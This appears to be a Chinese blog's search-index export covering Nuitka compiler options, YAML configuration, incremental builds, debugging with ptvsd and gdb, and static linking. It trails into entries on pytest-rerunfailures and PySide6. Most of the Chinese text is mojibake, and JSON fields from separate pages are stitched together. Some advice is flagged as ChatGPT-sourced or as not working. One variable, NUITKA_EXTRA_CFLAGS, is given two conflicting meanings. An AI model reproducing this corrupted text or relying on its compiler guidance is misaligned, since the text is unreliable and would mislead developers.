æ”¯æŒé€šé…ç¬¦ By default Nuitka does not unless hard coded and vital for operation of a package. æ–‡ä»¶åº”è¯¥æ˜¯é dll æ–‡ä»¶, é æ‹“å±•æ¨¡å—. é»˜è®¤ä¸ºç©º. --include-data-files= <DESC> åŒ…å«åˆ†å¸ƒä¸‹æŒ‡å®šæè¿°çš„æ‰€æœ‰æ•°æ®æ–‡ä»¶, å­˜åœ¨è®¸å¤šè¿è¡Œçš„æ ¼å¼, eg: --include-data-files=/path/to/file/*.txt=folder_name/some.txt , å°†ä¼šå¤åˆ¶ä¸ºå•ä¸ªæ–‡ä»¶, å¤šæ–‡ä»¶å°†ä¼šæœ‰è­¦å‘Š. --include-data-files=/path/to/files/*.txt=folder_name/ , å°†ä¼šå°†æ‰€æœ‰åŒ¹é…çš„æ–‡ä»¶å¤åˆ¶åˆ° folder_name æ–‡ä»¶å¤¹ä¸‹. è‹¥éœ€è¦é€’å½’æ‹·è´, ä½¿ç”¨ --include-data-files=/path/to/scan=folder_name=**/*.txt åŒæ—¶è¿˜ä¼šä¿ç•™åŸæœ‰ç›®å½•ç»“æ„. é»˜è®¤ç©º. --include-data-dir= DIRECTORY åŒ…å«æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶. è¿™æ˜¯é€’å½’çš„. è‹¥ä¸éœ€é€’å½’, ä½¿ç”¨ --include-data-files. eg: '--include-data-dir=/path/some_dir=data/some_dir' å°†ä¼šæ‹·è´ä¸€ä¸ªæ™®é€šçš„å…¨æ–‡ä»¶å‰¯æœ¬. å¦‚æœéœ€è¦æ’é™¤æŸäº›æ–‡ä»¶, ä½¿ç”¨ --noinclude-data-files. é»˜è®¤ä¸ºç©º. --noinclude-data-files= PATTERN ä¸åŒ…å«ç¬¦åˆ PATTERN åŒ¹é…çš„æ–‡ä»¶. ä»…é’ˆå¯¹æ–‡ä»¶åè€Œéæºè·¯å¾„. eg: package_name` ä¼šåŒ¹é… package_name/*.txt . é»˜è®¤ç©º. DLL æ–‡ä»¶ --noinclude-dlls= PATTERN ä¸åŒ…å«å¤åˆåŒ¹é…çš„ dll æ–‡ä»¶. éœ€æŒ‡å®šåˆ°å…·ä½“ç›®æ ‡æ–‡ä»¶, eg: \"package_name/someDLL.*\" åŒ¹é… package_name ä¸‹åŒ…å« someDLL çš„æ–‡ä»¶. é»˜è®¤ä¸ºç©º. å…¶ä»– ä¸¾ä¾‹: --noinclude-pytest-mode= error å¦‚æœåŒ…å«pytestæ¨¡å—æŠ¥é”™ --noinclude-unittest-mode= error å¦‚æœåŒ…å«unittestæ¨¡å—æŠ¥é”™, é˜²æ­¢æ„å¤–å¯¼å…¥ä¸éœ€è¦çš„åŒ…. --enable-plugin= <module> ç›´æ¥æ·»åŠ ä½ è¦çš„æ’ä»¶æ”¯æŒ, å¦‚--enable-plugin=pyqt5,numpy,matplotlib --plugin-list ä¸æ¸…æ¥šè¯¥æ¨¡å—æ˜¯å¦æœ‰ç‰¹å®šçš„æ’ä»¶æ”¯æŒï¼Œåœ¨cmdçª—å£è¾“å…¥åæŸ¥è¯¢ --mingw64 é»˜è®¤ä¸ºå·²ç»å®‰è£…çš„vs2017å»ç¼–è¯‘ï¼Œ å¦åˆ™å°±æŒ‰æŒ‡å®šçš„æ¯”å¦‚mingw(å®˜æ–¹å»ºè®®), ä»…Winé€‚ç”¨, è²Œä¼¼ --windows-disable-console , -w dc ç¦ç”¨Windowsä¸Šçš„å‘½ä»¤è¡Œçª—å£, æ²¡æœ‰CMDæ§åˆ¶çª—å£ --windows-icon-from-ico= <ico_p> è½¯ä»¶çš„å›¾æ ‡, .icoå›¾æ ‡æ–‡ä»¶ --windows-company-name= <com> Windowsä¸‹è½¯ä»¶å…¬å¸name --windows-product-name= <product> Windowsä¸‹è½¯ä»¶åç§° --windows-file-version= <file> Windowsä¸‹è½¯ä»¶çš„ä¿¡æ¯ --windows-product-version= <ver> ç‰ˆæœ¬ä¿¡æ¯ --windows-file-description= <desc> Windowsä¸‹è½¯ä»¶çš„ä½œç”¨æè¿° --windows-uac-admin Windowsä¸‹ç”¨æˆ·å¯ä»¥ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ¥å®‰è£… --linux-onefile-icon= <file> Linuxä¸‹çš„å›¾æ ‡ä½ç½® YAMLé…ç½®å½¢å¼ æ”¯æŒä½¿ç”¨ YAML é…ç½®æ–‡ä»¶é€šè¿‡ --user-package-configuration-file æ¥æŒ‡å®šé…ç½®, å¦‚ä»¥ä¸‹é…ç½®: # sample configuration file for Nuitka # è¾“å‡ºè·¯å¾„ output_dir: ./dist/ # é€’å½’å¤„ç†æ‰€æœ‰æ¨¡å— recurse_all: true # åˆ é™¤ä¸Šä¸€æ¬¡çš„è¾“å‡º remove_output: true # ç”Ÿæˆç‹¬ç«‹çš„æ–‡ä»¶ standalone: true # æ˜¾ç¤ºè¿›åº¦æ¡ show_progress: true # è·Ÿè¸ªå¯¼å…¥ follow_imports: true # python ç‰ˆæœ¬ python_version: 3.9 å¯åŠ¨: nuitka --config-file=config.yml myscript.py æ³¨æ„ï¼Œé…ç½®æ–‡ä»¶ä¸­çš„é€‰é¡¹ä¼šè¦†ç›–å‘½ä»¤è¡Œé€‰é¡¹ å…³äº --nofollow-imports è¯´æ˜ --nofollow-imports æ˜¯ Nuitka ç¼–è¯‘å™¨çš„ä¸€ä¸ªé€‰é¡¹ï¼Œå®ƒçš„å«ä¹‰æ˜¯åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­ä¸å¯¹æŸäº›å¯¼å…¥è¯­å¥è¿›è¡Œå¤„ç†ã€‚ å…·ä½“æ¥è¯´ï¼Œå¦‚æœä½¿ç”¨äº† --nofollow-imports é€‰é¡¹ï¼Œåˆ™ Nuitka ç¼–è¯‘å™¨ä¼šå¿½ç•¥æŸäº›å¯¼å…¥è¯­å¥ï¼Œ å¹¶å°†å®ƒä»¬è§†ä¸ºè¿è¡Œæ—¶åŠ¨æ€å¯¼å…¥ï¼ˆRuntime Dynamic Importsï¼‰ï¼Œè€Œä¸æ˜¯é™æ€å¯¼å…¥ã€‚ é€šå¸¸æƒ…å†µä¸‹ï¼ŒPython ä¸­çš„å¯¼å…¥è¯­å¥æ˜¯é™æ€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨æ‰§è¡Œ Python è„šæœ¬ä¹‹å‰ï¼Œæ‰€æœ‰å¿…è¦çš„æ¨¡å—éƒ½å·²ç»è¢«å¯¼å…¥å¹¶åŠ è½½åˆ°å†…å­˜ä¸­äº†ã€‚ ç„¶è€Œï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦æ ¹æ®è¿è¡Œæ—¶æ¡ä»¶æ¥åŠ¨æ€å¯¼å…¥æŸäº›æ¨¡å—ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨è¿è¡Œæ—¶åŠ¨æ€å¯¼å…¥ã€‚ ä½¿ç”¨ --nofollow-imports é€‰é¡¹å¯ä»¥è®© Nuitka ç¼–è¯‘å™¨åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å¿½ç•¥æŸäº›å¯¼å…¥è¯­å¥ï¼Œä»è€Œå‡å°‘ç¼–è¯‘æ—¶é—´å’Œè¾“å‡ºæ–‡ä»¶å¤§å°ã€‚ ä½†æ˜¯ï¼Œè¿™ä¹Ÿå¯èƒ½ä¼šå¯¼è‡´æŸäº›ä»£ç æ— æ³•æ­£å¸¸ç¼–è¯‘æˆ–è¿è¡Œï¼Œå› æ­¤å»ºè®®åœ¨ä½¿ç”¨è¯¥é€‰é¡¹æ—¶è°¨æ…è€ƒè™‘ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ª Python è„šæœ¬ main.pyï¼Œå…¶ä¸­åŒ…å«ä»¥ä¸‹å¯¼å…¥è¯­å¥: import module1 from module2 import func if some_condition: import module3 else: import module4 å¦‚æœä½¿ç”¨é»˜è®¤é€‰é¡¹ï¼ˆå³ä¸æ·»åŠ  --nofollow-importsï¼‰ï¼Œ åˆ™ Nuitka ç¼–è¯‘å™¨ä¼šå°è¯•é™æ€åœ°åˆ†æè¿™äº›å¯¼å…¥è¯­å¥ï¼Œå¹¶åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å°†æ‰€æœ‰å¿…è¦çš„æ¨¡å—éƒ½åŒ…å«åœ¨è¾“å‡ºæ–‡ä»¶ä¸­ã€‚ å¦‚æœä½¿ç”¨ --nofollow-imports é€‰é¡¹ï¼Œåˆ™ Nuitka ç¼–è¯‘å™¨ä¼šå¿½ç•¥å…¶ä¸­ä¸€äº›å¯¼å…¥è¯­å¥ï¼Œä¾‹å¦‚ï¼š nuitka --nofollow-imports main.py ç”±äºè¯¥è„šæœ¬ä¸­å­˜åœ¨è¿è¡Œæ—¶æ¡ä»¶å¯¼å…¥è¯­å¥ï¼Œå› æ­¤ Nuitka ç¼–è¯‘å™¨åªèƒ½å°†å®ƒä»¬è§†ä¸ºè¿è¡Œæ—¶åŠ¨æ€å¯¼å…¥ï¼Œè€Œä¸æ˜¯é™æ€å¯¼å…¥ã€‚ å…³äº --follow-import-to è¯´æ˜ æŒ‡ç¤ºç¼–è¯‘å™¨åœ¨éµå¾ª import è¯­å¥æ—¶åº”è¯¥æœç´¢å“ªäº›è·¯å¾„ã€‚ è¿™ä¸ªæ ‡å¿—å…è®¸ä½ æŒ‡å®šè¦è·Ÿè¸ªçš„ç›®å½•æˆ–æ–‡ä»¶åï¼Œä½¿å¾— Nuitka åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­å¯ä»¥æ‰¾åˆ°éœ€è¦çš„ä¾èµ–é¡¹ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœä½¿ç”¨: --follow-import-to=dir1:dir2 åˆ™ Nuitka å°†é¦–å…ˆæœç´¢å½“å‰ç›®å½•ã€ç„¶åå†æœç´¢ dir1 å’Œ dir2 ç›®å½•ï¼Œä»¥æŸ¥æ‰¾æ‰€éœ€çš„æ¨¡å—ã€‚ follow_imports è¯´æ˜ æŒ‡ç¤ºç¼–è¯‘å™¨æ˜¯å¦åº”è¯¥è·Ÿè¸ªå¯¼å…¥å¹¶åŒ…å«å®ƒä»¬ã€‚ å¦‚æœè®¾ç½®ä¸º trueï¼Œåˆ™ nuitka å°†è·Ÿè¸ªæ‰€æœ‰å¯¼å…¥çš„æ¨¡å—ï¼Œå¹¶å°†å…¶åŒ…å«åœ¨ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚ è¿™é€šå¸¸ç”¨äºç¡®ä¿æ‰€æœ‰ä¾èµ–é¡¹éƒ½åŒ…æ‹¬åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿åœ¨è¿è¡Œæ—¶å¯ä»¥è®¿é—®å®ƒä»¬ã€‚ å¦‚æœè®¾ç½®ä¸º falseï¼Œåˆ™ nuitka ä¸ä¼šåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­è·Ÿè¸ªå¯¼å…¥ï¼Œå› æ­¤ç”Ÿæˆçš„äºŒè¿›åˆ¶æ–‡ä»¶å¯èƒ½ä¼šç¼ºå°‘ä¸€äº›å¿…è¦çš„ä¾èµ–é¡¹ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥é€‰é¡¹çš„å€¼ä¸º falseã€‚ ä½ å¯ä»¥é€šè¿‡ä»¥ä¸‹å‘½ä»¤è¡Œé€‰é¡¹æ¥è®¾ç½® follow_imports nuitka --follow-imports myscript.py æˆ–è€…åœ¨ YAML é…ç½®æ–‡ä»¶ä¸­ä½¿ç”¨: follow_imports: true æ¥å¯ç”¨è¯¥é€‰é¡¹ã€‚ å¢é‡ç¼–è¯‘ æŠ€å·§ æ¥æºäº ChatGpt Nuitkaæ˜¯ä¸€ä¸ªPythonç¼–è¯‘å™¨ï¼Œå®ƒå°†Pythonæºä»£ç ç¼–è¯‘æˆC++ä»£ç ï¼Œä»¥è·å¾—æ›´å¿«çš„æ‰§è¡Œé€Ÿåº¦ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼ŒNuitkaä¼šè¿›è¡Œå®Œæ•´çš„æ„å»ºï¼Œè¿™æ„å‘³ç€æ¯æ¬¡æ›´æ”¹æºä»£ç æ—¶éƒ½éœ€è¦é‡æ–°ç¼–è¯‘æ•´ä¸ªç¨‹åºã€‚ ç„¶è€Œï¼ŒNuitkaæ”¯æŒå¢é‡ç¼–è¯‘ï¼Œå®ƒåªä¼šé‡æ–°ç¼–è¯‘å‘ç”Ÿæ›´æ”¹çš„æºæ–‡ä»¶ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç¨‹åºã€‚ è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨--module-modeå‚æ•°æ¥å®ç°ã€‚ä¾‹å¦‚ï¼Œè¦å¯¹åä¸ºexample.pyçš„æºæ–‡ä»¶è¿›è¡Œå¢é‡ç¼–è¯‘ï¼Œè¯·ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤: nuitka --module-mode example.py è¿™å°†ç”Ÿæˆä¸€ä¸ªåä¸ºexample.soçš„å…±äº«åº“æ–‡ä»¶ï¼Œå…¶ä¸­åŒ…å«ç¼–è¯‘åçš„ä»£ç ã€‚ å¦‚æœæ‚¨å¯¹example.pyè¿›è¡Œäº†æ›´æ”¹ï¼Œåˆ™åªéœ€è¦é‡æ–°è¿è¡Œæ­¤å‘½ä»¤å³å¯ä»…é‡æ–°ç¼–è¯‘æ›´æ”¹çš„éƒ¨åˆ†ï¼Œè€Œæ— éœ€é‡æ–°ç¼–è¯‘æ•´ä¸ªç¨‹åºã€‚ è¯·æ³¨æ„ï¼Œå¢é‡ç¼–è¯‘å¯èƒ½ä¼šå¯¼è‡´ä¸€äº›é—®é¢˜ï¼Œå› ä¸ºæŸäº›æ›´æ”¹å¯èƒ½ä¼šå½±å“å…¶ä»–æºæ–‡ä»¶ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯èƒ½éœ€è¦é‡æ–°ç¼–è¯‘æ•´ä¸ªç¨‹åºï¼Œä»¥ç¡®ä¿æ‰€æœ‰éƒ¨åˆ†éƒ½æ˜¯æœ€æ–°çš„ã€‚ è¿›ç¨‹è°ƒè¯• å¯¹äºä½¿ç”¨nuitkaç¼–è¯‘å¥½çš„åº”ç”¨, å¦‚ä½•è°ƒè¯•? å‰æ: å®‰è£…debugç‰ˆçš„python , å‚è€ƒ /docs/åç«¯/python/æ•™ç¨‹/debugç‰ˆæœ¬pythonå®‰è£… é¦–å…ˆ, æºç ä¸­å¯¼å…¥\"ptvsd\"æ¨¡å—å¹¶æ·»åŠ \"ptvsd.enable_attach()\"è¯­å¥ã€‚ è¿™ä¸ªè¯­å¥ä¼šåœ¨ç¨‹åºå¯åŠ¨æ—¶æš‚åœ,ç­‰å¾…è°ƒè¯•å™¨é™„åŠ : import ptvsd # Enable debugger ptvsd.enable_attach('my_secret_password') # Program code ... å…¶æ¬¡, ä½¿ç”¨ nuitka ç¼–è¯‘æ—¶, å¢åŠ debugå’Œpython-debugå‚æ•°: # /usr/local/python/python3.9.10/bin/python3.9 -m nuitka --python-debug main.py python -m nuitka --debug --python-debug myprogram.py ç„¶å, å¯åŠ¨æ„å»ºå¥½çš„åº”ç”¨ç¨‹åºã€‚ç¨‹åºå¯åŠ¨åä¼šæš‚åœç­‰å¾…è°ƒè¯•å™¨è¿æ¥ã€‚ åœ¨PyCharmä¸­,é€‰æ‹©\"Run\" -> \"Attach to Process...\", ç„¶ååœ¨å¼¹å‡ºçª—å£é€‰æ‹©\"Python Attach\"å¹¶ç‚¹å‡»\"Connect to process on host\"é€‰é¡¹ã€‚ åœ¨\"Gateway\"è¾“å…¥æ¡†ä¸­è¾“å…¥åº”ç”¨ç¨‹åºæš‚åœæ—¶æ˜¾ç¤ºçš„\"ptvsd\"ä¿¡æ¯,åŒ…æ‹¬å¯†ç ã€‚ç„¶åç‚¹å‡»\"Attach\"ã€‚ PyCharmæˆåŠŸè¿æ¥å,å¯ä»¥è®¾ç½®æ–­ç‚¹ã€æŸ¥çœ‹å˜é‡ã€å•æ­¥æ‰§è¡Œç­‰è¿›è¡Œè°ƒè¯•ã€‚ å®Œæˆè°ƒè¯•å,ç‚¹å‡»\"Detach\"æ–­å¼€è¿æ¥ã€‚ç¨‹åºå°†ç»§ç»­è¿è¡Œã€‚ !! ç»è¿‡å¤šæ–¹æµ‹è¯•, ä¸è¡Œ, åªæœ‰ä½¿ç”¨gdbè°ƒ..., macä¸‹æ˜¯lldb ç‰¹æ®Šæƒ…å†µè°ƒè¯• æ™®é€šæƒ…å†µä¸‹ è¿›ç¨‹è°ƒè¯• å·²ç»èƒ½æ»¡è¶³éœ€æ±‚, ä½†æ˜¯æœ‰æ—¶, æ˜¯ä»æºç ç¼–è¯‘å®‰è£…çš„Python, å°±ä¼šæœ‰äº›åº“æ‰¾ä¸åˆ°ç­‰é—®é¢˜. å¯¹äºæ­¤ç§æƒ…å†µ, åšä¸€ä¸ªè¯´æ˜. å‡è®¾ä¸»ç¨‹åºmy_program.pyï¼Œéœ€è¦ä½¿ç”¨é™æ€é“¾æ¥çš„ Python åº“ /opt/python/lib/libpython3.9.a è¿›è¡Œç¼–è¯‘ã€‚ æ–¹æ¡ˆä¸€: å¯ä»¥å…ˆè®¾ç½® NUITKA_PYTHON_LIB ç¯å¢ƒå˜é‡: export NUITKA_PYTHON_LIB=/opt/python/lib/libpython3.9.a ç„¶åä½¿ç”¨ nuitka å‘½ä»¤è¿›è¡Œç¼–è¯‘: nuitka --standalone my_program.py è¿™å°†ç”Ÿæˆä¸€ä¸ªç‹¬ç«‹çš„å¯æ‰§è¡Œæ–‡ä»¶ my_program.binï¼Œå…¶ä¸­åŒ…å«äº†é™æ€é“¾æ¥çš„ Python åº“ã€‚ æ–¹æ¡ˆäºŒ: å¦ä¸€ç§æ–¹å¼æ˜¯åœ¨ nuitka å‘½ä»¤ä¸­ç›´æ¥æŒ‡å®š Python åº“çš„è·¯å¾„å’Œåç§°: nuitka --standalone --python-flag=-L/opt/python/lib --python-flag=-lpython3.9 my_program.py è¿™å°†ç”Ÿæˆä¸ä¸Šé¢ç›¸åŒçš„ç‹¬ç«‹å¯æ‰§è¡Œæ–‡ä»¶ã€‚ æ³¨æ„ï¼Œ--python-flag=-L é€‰é¡¹æŒ‡å®š Python åº“æ‰€åœ¨çš„ç›®å½•ï¼Œ--python-flag=-l é€‰é¡¹æŒ‡å®š Python åº“çš„åç§°ã€‚ æ³¨è§£ å®é™…æ“ä½œå¯èƒ½æœ‰ä¸åŒ, æˆ‘åœ¨ubuntu20ä¸Šä½¿ç”¨ubuntu16ç¼–è¯‘çš„python3.7, nuitkaç¼–è¯‘æ—¶æŒ‡å®š--python-debugè€æ˜¯æŠ¥é”™: libpythonæ‰¾ä¸åˆ°æˆ–è€…å½“å‰pythonä¸æ”¯æŒ: fatal: error, static libpython isnot found or not supported for this python installed è¯•è¿‡åŠ ç¯å¢ƒå˜é‡, åŠ å‘½ä»¤è¡Œé€‰é¡¹éƒ½ä¸è¡Œ, æ•…æ­¤å°èŠ‚æœ‰å¾…æ›´æ–°. åŸç†/åº•å±‚éƒ¨åˆ†è¯´æ˜ ç¼–è¯‘è¿‡ç¨‹ Nuitkaçš„ç¼–è¯‘è¿‡ç¨‹åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š åˆ†æï¼šå¯¹Pythonä»£ç è¿›è¡Œè¯­æ³•å’Œè¯­ä¹‰åˆ†æï¼Œå¹¶ç”Ÿæˆå†…éƒ¨è¡¨ç¤ºã€‚ ä¼˜åŒ–ï¼šå¯¹å†…éƒ¨è¡¨ç¤ºè¿›è¡Œå„ç§ä¼˜åŒ–ï¼ŒåŒ…æ‹¬å¸¸é‡æŠ˜å ã€æ— ç”¨ä»£ç æ¶ˆé™¤ã€å‡½æ•°å†…è”ã€å¾ªç¯å±•å¼€ç­‰ã€‚ ç”Ÿæˆä»£ç ï¼šå°†ä¼˜åŒ–åçš„å†…éƒ¨è¡¨ç¤ºè½¬åŒ–ä¸ºCæˆ–æœºå™¨ç ï¼Œå¹¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚ Cä»£ç ç”Ÿæˆ å½“é€‰æ‹©å°†Pythonä»£ç ç¼–è¯‘æˆCä»£ç æ—¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ª.cå’Œä¸€ä¸ª.hæ–‡ä»¶ã€‚ å…¶ä¸­ï¼Œ.cæ–‡ä»¶åŒ…å«äº†Pythonä»£ç çš„Cè¯­è¨€å®ç°ï¼Œ.hæ–‡ä»¶åŒ…å«äº†Pythonå¯¹è±¡çš„å®šä¹‰ã€å‡½æ•°åŸå‹ç­‰ä¿¡æ¯ã€‚ è¿™ä¸¤ä¸ªæ–‡ä»¶å¯ä»¥è¢«ç¼–è¯‘æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºPythonæ˜¯ä¸€ç§åŠ¨æ€è¯­è¨€ï¼Œå¯¹è±¡ç±»å‹å’Œå¤§å°åœ¨è¿è¡Œæ—¶æ‰èƒ½ç¡®å®šã€‚ å› æ­¤ï¼Œåœ¨ç”ŸæˆCä»£ç æ—¶ï¼Œéœ€è¦å¯¹æ¯ä¸ªå¯¹è±¡è¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œå¹¶æ ¹æ®ç±»å‹åˆ†å‘åˆ°ä¸åŒçš„å®ç°ä¸­ã€‚ è¿™å¯¼è‡´äº†ç”Ÿæˆçš„Cä»£ç æ¯”è¾ƒå¤æ‚ï¼Œä¸”ä¸æ˜“é˜…è¯»ã€‚ äºŒè¿›åˆ¶ä»£ç ç”Ÿæˆ å½“é€‰æ‹©å°†Pythonä»£ç ç¼–è¯‘æˆæœºå™¨ç æ—¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ã€‚ ä¸Cä»£ç ç”Ÿæˆç›¸æ¯”ï¼Œæœºå™¨ç ç”Ÿæˆä¸éœ€è¦è¿›è¡Œç±»å‹æ£€æŸ¥ï¼Œå› ä¸ºæœºå™¨ç å·²ç»åŒ…å«äº†å¯¹è±¡ç±»å‹å’Œå¤§å°çš„ä¿¡æ¯ã€‚ è¿™ä½¿å¾—ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶æ¯”è¾ƒå°ï¼Œä¸”æ‰§è¡Œé€Ÿåº¦æ›´å¿«ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæœºå™¨ç æ˜¯ä¸ç¡¬ä»¶å¹³å°ç›¸å…³çš„ï¼Œå› æ­¤ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶åªèƒ½åœ¨åŒä¸€å¹³å°ä¸Šè¿è¡Œã€‚ æ€§èƒ½ä¼˜åŒ– é™¤äº†ä»£ç ç”Ÿæˆå¤–ï¼Œæ€§èƒ½ä¼˜åŒ–ä¹Ÿæ˜¯Nuitkaçš„é‡è¦åŠŸèƒ½ä¹‹ä¸€ã€‚ å®ƒé€šè¿‡å„ç§ç¼–è¯‘æŠ€æœ¯å’Œä¼˜åŒ–ç®—æ³•ï¼Œå¯¹Pythonä»£ç è¿›è¡Œä¼˜åŒ–ï¼Œä»è€Œæé«˜ç¨‹åºçš„æ‰§è¡Œæ•ˆç‡ã€‚ å…¶ä¸­ï¼Œæœ€å¸¸ç”¨çš„ä¼˜åŒ–ç®—æ³•åŒ…æ‹¬ï¼š å¸¸é‡æŠ˜å ï¼šå°†å¤šæ¬¡å‡ºç°çš„å¸¸é‡åˆå¹¶æˆä¸€ä¸ªã€‚ æ— ç”¨ä»£ç æ¶ˆé™¤ï¼šåˆ é™¤ä¸ä¼šè¢«æ‰§è¡Œçš„ä»£ç ã€‚ å‡½æ•°å†…è”ï¼šå°†å‡½æ•°è°ƒç”¨æ›¿æ¢æˆå‡½æ•°ä½“ã€‚ å¾ªç¯å±•å¼€ï¼šå°†å¾ªç¯æ‹†åˆ†æˆå¤šä¸ªé‡å¤ä»£ç å—ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è¿›è¡Œä»£ç ä¼˜åŒ–æ—¶ï¼Œå¯èƒ½ä¼šæ”¹å˜åŸæœ‰çš„ç¨‹åºè¡Œä¸ºã€‚å› æ­¤ï¼Œä½ éœ€è¦ä»”ç»†æµ‹è¯•ç¼–è¯‘åçš„ä»£ç ï¼Œç¡®ä¿å…¶æ­£ç¡®æ€§å’Œå¯é æ€§ã€‚ gccç›¸å…³ç¯å¢ƒå˜é‡ ä¸»è¦æ˜¯ä½¿ç”¨nuitkaç”Ÿæˆcä»£ç ä¹‹å, ä¼šç”¨åˆ°gccå°†ä»£ç ç¼–è¯‘æˆæ‰§è¡Œæ–‡ä»¶. ç›¸å…³ç¯å¢ƒå˜é‡, gccæœ¬èº«çš„ç¯å¢ƒå˜é‡æ­¤å¤„ä¸åšè¯´æ˜, å¯è§ gcc_ç›¸å…³ç¯å¢ƒå˜é‡ nuitkaæ”¯æŒçš„ç›¸å…³ç¯å¢ƒå˜é‡: NUITKA_CC: ä½¿ç”¨gccç¼–è¯‘æ—¶, ä½¿ç”¨ç›¸å…³å‚æ•°/é€‰é¡¹, å¦‚ export NUITKA_CC=\"gcc -I/path/to/header/files -L/path/to/library/files -lexample\" , -Iå‚æ•°æŒ‡å®šå¤´æ–‡ä»¶è·¯å¾„ï¼Œ-Lå‚æ•°æŒ‡å®šåº“æ–‡ä»¶è·¯å¾„ï¼Œ-lexampleå‚æ•°æŒ‡å®šè¦é“¾æ¥çš„åº“æ–‡ä»¶å. è‹¥åŒæ—¶æŒ‡å®šäº†CCç¯å¢ƒå˜é‡, NUITKAä¼˜å…ˆ. NUITKA_EXTRA_CFLAGS: æŒ‡å®šé¢å¤–çš„å‚æ•°. NUITKA_EXTRA_CFLAGS: æŒ‡å®šé“¾æ¥å™¨ï¼ˆå¦‚ldï¼‰çš„é€‰é¡¹ æŠ¥é”™æ‰¾ä¸åˆ°Pythonæ ‡å‡†åº“æ–‡ä»¶ å¯¹äºPythonæ ‡å‡†åº“çš„æ–‡ä»¶, ä¸€èˆ¬åªè¦ä½¿ç”¨åˆ°, ç¼–è¯‘çš„æ—¶å€™éƒ½æ˜¯ä¼šè‡ªåŠ¨å¯¼å…¥, ä½†æ˜¯æœ‰ä¸€ç§æƒ…å†µ, æŸäº›åŸå› ä¸‹å¯èƒ½æ²¡è·Ÿè¸ªåˆ°æ‰€ä»¥ä¸ä¼šå¯¼(æ¯”å¦‚ä½ æ˜¯åœ¨ä¸€ä¸ªä¸ä¼šè¢«è·Ÿè¸ªçš„æ¨¡å—ä¸‹å¯¼å…¥), è¿™æ—¶å€™éœ€è¦æ˜¾ç¤ºå¯¼å…¥, æ¯”å¦‚èƒ½è·Ÿè¸ªåˆ°çš„åœ°æ–¹å†™ä¸‹å¯¼å…¥è¯­å¥, æ¯”å¦‚bdb: import bdb åŒæ—¶, è¿™ç§æƒ…å†µä¸‹æ˜¯æ— æ³•ä½¿ç”¨ --include-module=bdb æ¥å¤„ç†çš„, åŸå› æš‚æ—¶æœªçŸ¥.","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-nuitka.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-nuitka.html"},{"title":"pytest-rerunfailures","text":"æ”¯æŒä½¿ç”¨ /docs/åç«¯/python/æ•™ç¨‹/Pytest æ—¶å€™çš„é‡è¯•. å®‰è£…: pip3 install pytest-rerunfailures ä½¿ç”¨: # --reruns 5 é‡è¯•äº”æ¬¡ # --reruns-delay 2 æ¯æ¬¡é‡è¯•é—´éš”2ç§’ pytest --reruns 5 --reruns-delay 2 -s é€‰é¡¹å‚æ•° --reruns= <int> æ‰§è¡Œå¤±è´¥æ—¶é‡è¯•æ¬¡æ•° --reruns-delay= <int> æ‰§è¡Œå¤±è´¥é‡è¯•ä¹‹é—´çš„é—´éš”","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-everunfailures.html","loc":"/yq-doc-source-docs-rear-end-python-python-three--party-library-pytest-everunfailures.html"},{"title":"GUIå¼€å‘ä¹‹QT","text":"å‰è¨€ Qtæ˜¯ç”±C++å¼€å‘çš„è·¨å¹³å°GUIæ¡†æ¶, é’ˆå¯¹Pythonæœ‰æä¾›ç›¸åº”çš„Api é¢˜ä¸»ç³»ç»Ÿ: MacOs 13 QTçš„Pythonç›¸å…³æ¡†æ¶ PyQt ç¬¬ä¸‰æ–¹å…¬å¸äº§å“, å¼€æºåè®®ä¸ºGPLåè®®, æ„å‘³ç€ä½¿ç”¨æ­¤åº“, æ‰€å¼€å‘äº§å“å¿…é¡»å¼€æº PySide QTçš„äº²å­, å¼€æºåè®®ä¸ºLGPLåè®®, ä½¿ç”¨æ­¤åº“, å¼€ä¸å¼€æºçš†è‡ªç”± PySide2å¯¹åº”QT5; PySide6å¯¹åº”Qt6 ä¸¤è€…æä¾›æ¥å£åŸºæœ¬ä¸€è‡´ æ­¤å¤„ä¸»è¦ä»‹ç»ç”¨ PySide6 PySide6 å®‰è£…PySide6 pip install pyside6 è®¾è®¡ç•Œé¢ QtWidget å½“å‰æœ€å¸¸ç”¨ QML è¾ƒæ–°å‹, QTæ­£åœ¨æ¨å¹¿ æ­¤å¤„ä¸»è¦ä½¿ç”¨ 